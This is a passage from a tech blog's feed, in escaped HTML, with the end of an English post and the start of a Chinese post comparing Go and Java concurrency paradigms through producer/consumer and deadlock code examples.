%v\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;item&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;and the memory address is different.&lt;/p&gt;
&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;roduce item Addr: 0xc000014090&lt;br&gt;Consume item Addr: 0xc000120000&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Copying items will decrease performance more or less, that is the cost to decouple goroutine.&lt;/p&gt;
&lt;h1 id=&quot;conculsion&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#conculsion&quot;&gt;#&lt;/a&gt; Conculsion&lt;/h1&gt;
&lt;p&gt;In this article, we mention that Java&#39;s concurrency paradigm is base on Thread &amp;amp; Lock does not mean that you can not write Java&#39;s concurrency code like CSP. For example, you can use BlockingQueue. Similarly, Golang provides Mutex or RWMutex to developers who are familiar with Lock, too.&lt;br&gt;
What I want to say is you may see lots of Thread &amp;amp; Lock in Java&#39;s project more than CSP, you would see that thread-safe terms in Java&#39;s ecosystem, but You may see that Golang developers are caring more about select &amp;amp; channel while writing concurrency.&lt;br&gt;
In the next article, I will introduce some common concurrency patterns with channel &amp;amp; select in Goalng&#39;s blog and compare that to Java. I think that may uncover more differences between these two paradigms.&lt;/p&gt;
&lt;h1 id=&quot;reference&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#reference&quot;&gt;#&lt;/a&gt; Reference&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=KBZlN0izeiY&quot;&gt;GopherCon 2017: Kavya Joshi - Understanding Channels&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;https://pragprog.com/titles/pb7con/seven-concurrency-models-in-seven-weeks/&quot;&gt;Seven Concurrency Models in Seven Weeks When Threads Unravel&lt;/a&gt;&lt;/p&gt;

		</content>
	</entry>
	
	<entry>
		<title>併發程式典範 (Paradigms): Golang V.S. Java</title>
		<link href="https://tech-blog.cymetrics.io/posts/genchilu/concurrency-paradigms-golang-and-java-zh/"/>
		<updated>2021-08-29T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/genchilu/concurrency-paradigms-golang-and-java-zh/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;p&gt;當我回頭看剛開始學 Golang 的程式時，我發現我只是用 Golang 語法寫 Java 程式。尤其在併發程式的設計思路上 Golang 和 Java 完全不同：Java 習慣上會用 thread-safe 的概念設計併發，而 Golang 的設計上鼓勵開發者使用 channel 處理併發問題。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;p&gt;這篇文章主要想討論 Java 和 Golang 撰寫併發程式上的風格差異，希望能讓初學 Golang 的開發者在撰寫併發時，能對 Golang 的併發設計模式有些概念。&lt;/p&gt;
&lt;h1 id=&quot;%E4%BB%80%E9%BA%BC%E6%98%AF%E5%85%B8%E7%AF%84&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E4%BB%80%E9%BA%BC%E6%98%AF%E5%85%B8%E7%AF%84&quot;&gt;#&lt;/a&gt; 什麼是典範&lt;/h1&gt;
&lt;p&gt;程式典範是指規範如何撰寫程式的指導原則，一種更高位的設計模式， 像是物件導向程式設計 (Object Oriented Programming) 就是一種程式典範，其餘的還有函式語言程式設計 (Functional programming)。&lt;br&gt;
要注意的是，典範本身並無優劣之分，有的只是適用的情境不同。&lt;br&gt;
如同程式併發典範，撰寫併發程式也有典範，如 Thread &amp;amp; Lock 就是一種併發的典範。Java 在撰寫併發程式時即是依循 Thread &amp;amp; Lock。另一方面， Golang 的併發典範則更多是遵循 Communicating Sequential Process(CSP) 。接下來讓我們更深入探討兩種典範的差異。&lt;/p&gt;
&lt;h1 id=&quot;thread-%26-lock&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#thread-%26-lock&quot;&gt;#&lt;/a&gt; Thread &amp;amp; Lock&lt;/h1&gt;
&lt;p&gt;Thread &amp;amp; Lock 在運作上完全反映底層硬體的行為。基本上是不同 Thread 透過共享記憶體溝通，而透過 Lock 確保一次只有個 Thread 存取共享記憶體，即是互斥鎖的概念：&lt;br&gt;
&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/concurrency_paradigms_golang_and_Java/thread_and_lock.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;以經典的同步問題 - 生產者/消費者問題為例，Java 實作起來會像這樣：&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;    &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Lock&lt;/span&gt; lock &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReentrantLock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Queue&lt;/span&gt; queue &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;LinkedList&lt;/span&gt;&lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Condition&lt;/span&gt; con&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;lock&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newCondition&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; producer &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                lock&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;lock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;queue&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; size&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                        con&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;await&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;InterruptedException&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; item &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                queue&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;item&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Produce : &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; item&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                con&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                lock&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;unlock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            producer&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; consumer &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                lock&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;lock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;queue&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                        con&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;await&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;InterruptedException&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; item &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; queue&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Consume : &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; item&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                con&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                lock&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;unlock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            consumer&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;生產者和消費者透過 queue 溝通，每次往 queue 新增/刪除資料時，都會先用 lock 保護，確保一次只有一個 thread 能存取 queue。&lt;br&gt;
Thread &amp;amp; Lock 基本上完全模擬了底層硬體處理併發的行為，且大部分程式語言都有支援，因此可以廣泛應用在大多數的場景。&lt;br&gt;
但是 Thread &amp;amp; Lock 很難寫好，不小心會造成 deadlock。如以下的 code：&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; cacheLock &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; tableLock &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;oneMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;synchronized&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cacheLock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;synchronized&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;tableLock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;hio1&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;anotherMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;synchronized&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;tableLock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;synchronized&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cacheLock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;hio2&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt;  &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token function&quot;&gt;oneMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token function&quot;&gt;anotherMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span 